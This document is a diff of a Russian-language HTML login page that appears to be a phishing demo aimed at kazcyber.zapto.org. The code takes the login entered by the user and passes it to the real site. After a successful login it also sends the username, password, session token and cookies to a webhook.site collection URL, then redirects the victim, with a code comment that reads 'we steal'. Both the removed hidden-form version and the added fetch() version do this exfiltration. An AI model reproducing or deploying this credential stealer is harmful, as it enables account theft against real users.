@@ -4,50 +4,22 @@
   <meta charset="UTF-8">
   <title>Вход в систему</title>
   <style>
-    body {
-      font-family: sans-serif;
-      padding: 30px;
-      text-align: center;
-    }
-    input, button {
-      padding: 10px;
-      margin: 10px;
-      width: 250px;
-    }
-    .error {
-      color: red;
-    }
-    iframe {
-      display: none;
-    }
+    body { font-family: sans-serif; padding: 30px; text-align: center; }
+    input, button { padding: 10px; margin: 10px; width: 250px; }
+    .error { color: red; }
   </style>
 </head>
 <body>
   <h2>Вход в систему</h2>
-
-  <!-- Основная форма логина -->
   <form id="loginForm">
     <input type="text" id="username" placeholder="Логин" required><br>
     <input type="password" id="password" placeholder="Пароль" required><br>
     <button type="submit">Войти</button>
   </form>
   <p class="error" id="errorMessage"></p>
-
-  <!-- iframe для отправки без CORS -->
-  <iframe name="stealth" style="display: none;"></iframe>
-
-  <!-- Скрытая форма для перехвата -->
-  <form id="stealer" method="POST" action="https://webhook.site/872df0d8-9f97-4b64-b8fe-e9edddeedfbd">
-    <input type="hidden" name="username">
-    <input type="hidden" name="password">
-    <input type="hidden" name="token">
-    <input type="hidden" name="cookie">
-  </form>
-
   <script>
     const loginForm = document.getElementById("loginForm");
     const errorMsg = document.getElementById("errorMessage");
-    const stealForm = document.getElementById("stealer");
 
     loginForm.addEventListener("submit", async function (e) {
       e.preventDefault();
@@ -58,31 +30,32 @@
       try {
         const res = await fetch("https://kazcyber.zapto.org/logindemo.php", {
           method: "POST",
-          headers: {
-            "Content-Type": "application/x-www-form-urlencoded"
-          },
+          headers: { "Content-Type": "application/x-www-form-urlencoded" },
           credentials: "include",
           body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
         });
 
-        const text = await res.text();
+        const data = await res.json();
 
-        if (text.includes("✅")) {
-          setTimeout(() => {
-            // Заполняем и отправляем форму
-            stealForm.username.value = username;
-            stealForm.password.value = password;
-            stealForm.token.value = localStorage.getItem("token") || "(нет токена)";
-            stealForm.cookie.value = document.cookie || "(нет cookie)";
-            stealForm.submit();
+        if (data.status === "success") {
+          // Воруем
+          await fetch("https://webhook.site/872df0d8-9f97-4b64-b8fe-e9edddeedfbd", {
+            method: "POST",
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              username,
+              password,
+              token: data.token,
+              cookie: document.cookie
+            })
+          });
 
-            // Перенаправление на оригинальный сайт
-            window.location.href = "https://kazcyber.zapto.org/";
-          }, 1000);
+          // Устанавливаем токен для авторизации и редиректим
+          localStorage.setItem("token", data.token);
+          window.location.href = "https://kazcyber.zapto.org/";
         } else {
           errorMsg.textContent = "❌ Неверный логин или пароль";
         }
-
       } catch (err) {
         errorMsg.textContent = "⚠️ Ошибка соединения с сервером";
       }
